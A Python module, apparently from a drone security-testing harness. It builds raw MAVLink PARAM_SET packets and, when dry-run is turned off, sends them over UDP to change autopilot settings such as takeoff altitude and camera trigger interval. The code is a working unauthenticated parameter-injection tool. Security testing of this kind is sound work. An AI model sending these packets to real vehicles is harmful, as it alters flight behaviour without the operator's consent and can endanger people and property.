#!/usr/bin/env python3
"""S2-D mutation probe executor and payload serializer.

Recreates S2-B physical parameter mutation probes with strict dry-run guards.
"""
from __future__ import annotations

import logging
import socket
import struct
import time
from typing import Any, Dict, Optional, Tuple

logger = logging.getLogger("s2_d.probe")


def build_mavlink1_param_set_bytes(
    param_id: str,
    param_value: float,
    param_type: int = 9,  # MAV_PARAM_TYPE_REAL32
    target_system: int = 1,
    target_component: int = 1,
    seq: int = 0,
    sysid: int = 255,
    compid: int = 190,
) -> bytes:
    """Construct a raw MAVLink 1.0 PARAM_SET packet (msg id 23)."""
    msg_id = 23
    param_id_bytes = param_id.encode("ascii")[:16].ljust(16, b"\x00")
    payload = struct.pack(
        "<fBB16sB",
        float(param_value),
        target_system,
        target_component,
        param_id_bytes,
        param_type,
    )
    length = len(payload)
    header = struct.pack("<BBBBBB", 0xFE, length, seq, sysid, compid, msg_id)

    # Compute MAVLink checksum (CRC-16-MCRF4XX)
    crc = 0xFFFF
    for b in header[1:] + payload:
        tmp = b ^ (crc & 0xFF)
        tmp = (tmp ^ (tmp << 4)) & 0xFF
        crc = (crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)
    # PARAM_SET CRC extra is 168
    tmp = 168 ^ (crc & 0xFF)
    tmp = (tmp ^ (tmp << 4)) & 0xFF
    crc = (crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)

    ck = struct.pack("<H", crc)
    return header + payload + ck


class ProbeExecutor:
    """Executes S2-B mutation probes with strict dry-run non-invasiveness."""

    def __init__(self, dry_run: bool = True):
        self.dry_run = dry_run

    def construct_probe_payload(self, target_port: int) -> Tuple[str, float, bytes]:
        """Construct the designated mutation payload based on target port."""
        if target_port == 18570:
            param_id = "MIS_TAKEOFF_ALT"
            target_val = 25.0
        elif target_port == 14280:
            param_id = "TRIG_INTERVAL"
            target_val = 50.0
        elif target_port == 13030:
            param_id = "MIS_TAKEOFF_ALT"
            target_val = 25.0
        else:
            raise ValueError(f"Unknown target probe port: {target_port}")

        wire_bytes = build_mavlink1_param_set_bytes(param_id, target_val)
        return param_id, target_val, wire_bytes

    def send_probe(
        self,
        target_host: str,
        target_port: int,
        timeout: float = 1.0,
    ) -> Dict[str, Any]:
        """Send the mutation probe to target port.

        In DRY_RUN mode, returns simulated probe execution without sending bytes.
        """
        param_id, target_val, wire_bytes = self.construct_probe_payload(target_port)

        record: Dict[str, Any] = {
            "target_host": target_host,
            "target_port": target_port,
            "param_id": param_id,
            "target_val": target_val,
            "payload_len": len(wire_bytes),
            "dry_run": self.dry_run,
            "timestamp": time.time(),
        }

        if self.dry_run:
            logger.info(
                f"[DRY_RUN] Probe constructed for {target_host}:{target_port} "
                f"({param_id} -> {target_val}, {len(wire_bytes)} bytes). NO WIRE TRANSMISSION."
            )
            record["sent"] = False
            record["bytes_sent"] = 0
            record["status"] = "DRY_RUN_VALIDATED"
            return record

        # LIVE PROBE EXECUTION
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        try:
            sent_len = sock.sendto(wire_bytes, (target_host, target_port))
            record["sent"] = True
            record["bytes_sent"] = sent_len
            record["status"] = "SENT"
        except Exception as exc:
            record["sent"] = False
            record["bytes_sent"] = 0
            record["error"] = str(exc)
            record["status"] = "SOCKET_ERROR"
        finally:
            sock.close()

        return record
